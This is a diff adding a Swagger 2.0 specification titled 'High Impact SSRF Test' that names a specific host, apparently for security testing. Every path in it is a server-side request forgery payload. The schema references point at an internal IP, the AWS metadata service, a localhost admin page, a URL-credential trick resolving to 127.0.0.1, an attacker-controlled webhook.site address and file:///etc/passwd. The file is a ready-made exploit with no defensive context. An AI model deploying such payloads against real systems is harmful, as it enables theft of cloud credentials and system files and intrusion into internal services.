@@ -1,0 +1,56 @@
+swagger: "2.0"
+info:
+  title: "High Impact SSRF Test"
+  version: "1.0"
+host: "api.tektiklaode.visa.com.tr"
+schemes:
+  - https
+paths:
+  /ssrf1:
+    get:
+      summary: "SSRF to internal host"
+      responses:
+        200:
+          description: "SSRF to internal IP"
+          schema:
+            $ref: "http://127.0.0.1:8080/internal-api/swagger.json"
+  /ssrf2:
+    get:
+      summary: "SSRF to metadata service (AWS example)"
+      responses:
+        200:
+          description: "SSRF to AWS metadata"
+          schema:
+            $ref: "http://169.254.169.254/latest/meta-data/"
+  /ssrf3:
+    get:
+      summary: "SSRF to localhost port"
+      responses:
+        200:
+          description: "SSRF to localhost port 80"
+          schema:
+            $ref: "http://localhost:80/admin"
+  /ssrf4:
+    get:
+      summary: "SSRF with DNS rebinding style"
+      responses:
+        200:
+          description: "SSRF to private IP disguised as domain"
+          schema:
+            $ref: "http://internal.example.com@127.0.0.1/admin"
+  /ssrf5:
+    get:
+      summary: "SSRF to remote malicious webhook"
+      responses:
+        200:
+          description: "SSRF to attacker controlled URL"
+          schema:
+            $ref: "https://webhook.site/a44f8421-8b84-4309-bd87-18a8fb8ddc06"
+  /ssrf6:
+    get:
+      summary: "SSRF via file scheme (if supported)"
+      responses:
+        200:
+          description: "Attempt SSRF via local file read"
+          schema:
+            $ref: "file:///etc/passwd"
